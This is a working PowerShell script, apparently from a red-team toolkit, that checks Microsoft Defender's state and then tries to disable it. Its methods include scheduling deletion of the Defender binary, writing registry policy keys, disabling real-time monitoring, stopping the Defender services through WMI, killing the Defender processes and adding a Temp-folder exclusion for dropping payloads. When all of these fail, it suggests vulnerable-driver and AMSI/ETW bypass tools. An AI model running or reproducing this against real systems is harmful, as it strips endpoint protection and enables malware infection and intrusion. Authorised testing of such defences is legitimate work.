function IsAdmin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-DefenderState {
    <#
    .SYNOPSIS
        Probes current Defender/MDE state to determine which kill techniques are viable.
        Returns a hashtable so kill logic can make informed decisions instead of blind attempts.
    #>
    $state = @{
        TamperProtectionEnabled  = $false
        TamperProtectionSource   = "Unknown"
        RealTimeEnabled          = $false
        SenseRunning             = $false
        CloudProtectionEnabled   = $false
        DefenderServiceRunning   = $false
        IsVirtualMachine         = $false
        WDACEnforced             = $false
    }

    try {
        $status = Get-MpComputerStatus -ErrorAction Stop
        $state.TamperProtectionEnabled = [bool]$status.IsTamperProtected
        $state.TamperProtectionSource  = $status.TamperProtectionSource
        $state.RealTimeEnabled         = [bool]$status.RealTimeProtectionEnabled
    } catch {}

    try {
        $prefs = Get-MpPreference -ErrorAction Stop
        $state.CloudProtectionEnabled = ($prefs.MAPSReporting -ne 0)
    } catch {}

    try {
        $sense = Get-Service -Name "Sense" -ErrorAction Stop
        $state.SenseRunning = ($sense.Status -eq "Running")
    } catch {}

    try {
        $windefend = Get-Service -Name "WinDefend" -ErrorAction Stop
        $state.DefenderServiceRunning = ($windefend.Status -eq "Running")
    } catch {}

    try {
        $cs = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop
        $state.IsVirtualMachine = ($cs.Model -match "Virtual|VMware|VirtualBox|HVM|Xen|QEMU|KVM")
    } catch {}

    try {
        $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction Stop
        $state.WDACEnforced = ($dg.CodeIntegrityPolicyEnforcementStatus -eq 2)
    } catch {}

    return $state
}

if (-not (IsAdmin)) {
    Write-Host "Defender Kill    :                                            [??] Missing Privileges" -ForegroundColor DarkYellow
    return
}

# ---- Probe environment ----
Write-Host "Probing Defender state..." -ForegroundColor DarkGray
$defState = Get-DefenderState
$results = @()

if ($defState.WDACEnforced) {
    Write-Host "Defender Kill    :                                            [!!] WDAC Enforce mode active - unsigned code execution is blocked by CI policy" -ForegroundColor DarkYellow
}

if ($defState.TamperProtectionEnabled) {
    Write-Host "Defender Kill    :                                            [!!] Tamper Protection ON (Source: $($defState.TamperProtectionSource)) - registry/service kills will be reverted" -ForegroundColor DarkYellow
    Write-Host "                                                              Skipping guaranteed-fail techniques, attempting viable paths..." -ForegroundColor DarkGray
}

# ======================================================================
# Technique 1: PendingFileRenameOperations
# Schedules deletion of MsMpEng.exe on next reboot via Session Manager.
# Tamper Protection does not always guard this registry path.
# Caveat: Requires reboot. Defender can self-heal via Windows Update.
# ======================================================================
$t1Success = $false
try {
    $DefenderBinaryPath = "C:\Program Files\Windows Defender\MsMpEng.exe"
    $keyPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
    $newOp = "\??\$DefenderBinaryPath"

    if (-not (Get-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -PropertyType MultiString -Value @() -Force | Out-Null
    }

    $current = (Get-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations
    Set-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -Value ($current + $newOp | Where-Object { $_ -ne "" }) -Force

    $verify = (Get-ItemProperty -Path $keyPath -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue).PendingFileRenameOperations
    $t1Success = ($verify -like "*MsMpEng.exe*")
} catch {}

if ($t1Success) {
    $results += "PendingFileRenameOperations (reboot required)"
}

# ======================================================================
# Technique 2: GPO Registry Disable
# Only attempted when Tamper Protection is OFF. Writes are verified after
# a short sleep to detect silent TP reversion.
# ======================================================================
$t2Success = $false
if (-not $defState.TamperProtectionEnabled) {
    $regTargets = @(
        @{ Path = "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableRealtimeMonitoring"; Value = 1 },
        @{ Path = "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableBehaviorMonitoring"; Value = 1 },
        @{ Path = "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableOnAccessProtection"; Value = 1 },
        @{ Path = "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableIOAVProtection"; Value = 1 },
        @{ Path = "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableScanOnRealtimeEnable"; Value = 1 },
        @{ Path = "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name = "DisableIntrusionPreventionSystem"; Value = 1 },
        @{ Path = "HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine"; Name = "MpCloudBlockLevel"; Value = 0 },
        @{ Path = "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet"; Name = "SpynetReporting"; Value = 0 },
        @{ Path = "HKLM:\Software\Policies\Microsoft\Windows Defender\Spynet"; Name = "SubmitSamplesConsent"; Value = 2 },
        @{ Path = "HKLM:\Software\Policies\Microsoft\Windows Defender"; Name = "ServiceKeepAlive"; Value = 0 }
    )

    foreach ($target in $regTargets) {
        try {
            if (-not (Test-Path $target.Path)) { New-Item -Path $target.Path -Force | Out-Null }
            Set-ItemProperty -Path $target.Path -Name $target.Name -Value $target.Value -Type DWord -Force
        } catch {}
    }

    # WMI-based DisableAntiSpyware to dodge direct reg write monitoring
    try {
        $reg = Get-WmiObject -List | Where-Object { $_.Name -eq "StdRegProv" }
        $reg.SetDWORDValue(2147483650, "Software\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1) | Out-Null
    } catch {}

    # Verify persistence after brief delay
    Start-Sleep -Milliseconds 500
    try {
        $rtCheck = (Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -ErrorAction Stop).DisableRealtimeMonitoring
        if ($rtCheck -eq 1) { $t2Success = $true }
    } catch {}

    if ($t2Success) {
        $results += "GPO Registry Disable (Tamper Protection was OFF)"
    } else {
        Write-Host "Defender Kill    :                                            [??] Registry writes reverted - TP may have re-enabled silently" -ForegroundColor DarkYellow
    }
} else {
    Write-Host "Defender Kill    :                                            [--] Skipping registry techniques (TP is ON)" -ForegroundColor DarkGray
}

# ======================================================================
# Technique 3: Set-MpPreference cmdlet
# Uses the Defender PowerShell module's own API rather than raw registry
# writes. Behaves differently under certain TP/Intune configurations.
# ======================================================================
$t3Success = $false
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    Start-Sleep -Milliseconds 500
    $rtStatus = (Get-MpComputerStatus -ErrorAction Stop).RealTimeProtectionEnabled
    if (-not $rtStatus) {
        $t3Success = $true
        $results += "Set-MpPreference -DisableRealtimeMonitoring"
    }
} catch {}

# Additional preference weakening
try { Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue } catch {}
try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}

# ======================================================================
# Technique 4: Service manipulation via WMI
# Attempts to stop WinDefend, Sense, and WdNisSvc through WMI which
# uses a different access path than Stop-Service / sc.exe.
# ======================================================================
$t4Success = $false
$servicesToKill = @("WinDefend", "Sense", "WdNisSvc")

foreach ($svcName in $servicesToKill) {
    try {
        $svc = Get-Service -Name $svcName -ErrorAction Stop
        if ($svc.Status -eq "Running") {
            $wmiSvc = Get-WmiObject -Class Win32_Service -Filter "Name='$svcName'" -ErrorAction Stop
            $wmiSvc.StopService() | Out-Null
            Start-Sleep -Milliseconds 500
            $svc.Refresh()
            if ($svc.Status -ne "Running") {
                $t4Success = $true
                $results += "Service Stop ($svcName via WMI)"
            }
        }
    } catch {}
}

# ======================================================================
# Technique 5: Process termination (taskkill baseline check)
# Protected Process Light (PPL) blocks this on modern systems. This is
# a canary check — if it works, PPL is misconfigured.
# For real engagements: use BYOVD tools (Terminator, Backstab) or
# kernel callback removal instead.
# ======================================================================
$t5Success = $false
$defenderProcs = @("MsMpEng", "MsSense", "MpDlpService")

foreach ($proc in $defenderProcs) {
    try {
        $p = Get-Process -Name $proc -ErrorAction Stop
        & taskkill /F /PID $p.Id 2>&1 | Out-Null
        Start-Sleep -Milliseconds 300
        $check = Get-Process -Name $proc -ErrorAction SilentlyContinue
        if (-not $check) {
            $t5Success = $true
            $results += "Process Kill ($proc) - PPL may be misconfigured!"
        }
    } catch {}
}

# ======================================================================
# Technique 6: Exclusion injection
# Adds a path exclusion via Set-MpPreference. TP often allows exclusion
# modifications even when other changes are blocked, especially when
# TP source is ATP vs Intune. This is the most reliable soft-kill for
# dropping payloads into an ignored path.
# ======================================================================
$t6Success = $false
$exclusionTarget = "C:\Windows\Temp"
try {
    $currentExcl = (Get-MpPreference -ErrorAction Stop).ExclusionPath
    if ($currentExcl -notcontains $exclusionTarget) {
        Set-MpPreference -ExclusionPath $exclusionTarget -ErrorAction Stop
        Start-Sleep -Milliseconds 300
        $newExcl = (Get-MpPreference -ErrorAction Stop).ExclusionPath
        if ($newExcl -contains $exclusionTarget) {
            $t6Success = $true
            $results += "Exclusion Injection ($exclusionTarget) - REMOVE AFTER ENGAGEMENT"
            Write-Host "Defender Kill    :                                            [!!] Exclusion added to $exclusionTarget - CLEAN UP!" -ForegroundColor DarkRed
        }
    } else {
        Write-Host "Defender Kill    :                                            [**] $exclusionTarget already excluded" -ForegroundColor DarkGray
    }
} catch {}

# ======================================================================
# Technique 7: Defender Platform Version Enumeration
# Checks for multiple platform versions. Older versions may have known
# bypass vulnerabilities. Not an active kill, but useful reconnaissance.
# ======================================================================
$t7Info = $false
try {
    $platformPath = "C:\ProgramData\Microsoft\Windows Defender\Platform"
    if (Test-Path $platformPath) {
        $platforms = Get-ChildItem -Path $platformPath -Directory | Sort-Object Name -Descending
        if ($platforms.Count -gt 1) {
            $t7Info = $true
            Write-Host "Defender Kill    :                                            [**] $($platforms.Count) platform versions present: $($platforms[0].Name) (current) -> $($platforms[-1].Name) (oldest)" -ForegroundColor DarkGray
        }
    }
} catch {}

# ======================================================================
# Results
# ======================================================================
Write-Host ""
if ($results.Count -gt 0) {
    $lines = @(
        "",
        "||||||A red haze shatters Microsoft Defender violently, its protection slipping into darkness.||||||",
        "||||||A r d haze s at ers Mic os ft D fe der vi lent y,  ts pro ectio  s ip ing in o dark es .||||||",
        "|| |||A r d h  e s a  e s  ic os ft D f  d    i le t y   t   ro ec  o  s i  in  in o d rk e   ||||||",
        "|  |||  r d    e s a  e    ic  s f    f  d    i    t y   t      e   o  s    in  in o   r  e   |||| |",
        "    ||    d    e      e          f            i          t             s           o          |||   ",
        "    |                                                                                         ||    ",
        ""
    )
    foreach ($line in $lines) { Write-Host $line -ForegroundColor DarkRed }
    foreach ($r in $results) {
        Write-Host "Defender Kill    :                                            [KO] $r" -ForegroundColor DarkGray
    }
} else {
    Write-Host "Defender Kill    :                                            [OK] All techniques failed - Defender is well-hardened" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Recommendations for next steps:" -ForegroundColor DarkGray
    Write-Host "  - BYOVD (Bring Your Own Vulnerable Driver): Terminator, Backstab, KDU" -ForegroundColor DarkGray
    Write-Host "  - Kernel callback removal via vulnerable driver" -ForegroundColor DarkGray
    Write-Host "  - ETW patching to blind telemetry (userland)" -ForegroundColor DarkGray
    Write-Host "  - Direct syscalls to avoid API hooking" -ForegroundColor DarkGray
    Write-Host "  - AMSI/ETW bypass before payload execution" -ForegroundColor DarkGray
}

Write-Host ""
Write-Host "--- Environment State ---" -ForegroundColor DarkGray
Write-Host "  Tamper Protection  : $($defState.TamperProtectionEnabled) (Source: $($defState.TamperProtectionSource))" -ForegroundColor DarkGray
Write-Host "  Real-Time Enabled  : $($defState.RealTimeEnabled)" -ForegroundColor DarkGray
Write-Host "  Sense (EDR) Active : $($defState.SenseRunning)" -ForegroundColor DarkGray
Write-Host "  Cloud Protection   : $($defState.CloudProtectionEnabled)" -ForegroundColor DarkGray
Write-Host "  WDAC Enforced      : $($defState.WDACEnforced)" -ForegroundColor DarkGray
Write-Host "  Virtual Machine    : $($defState.IsVirtualMachine)" -ForegroundColor DarkGray
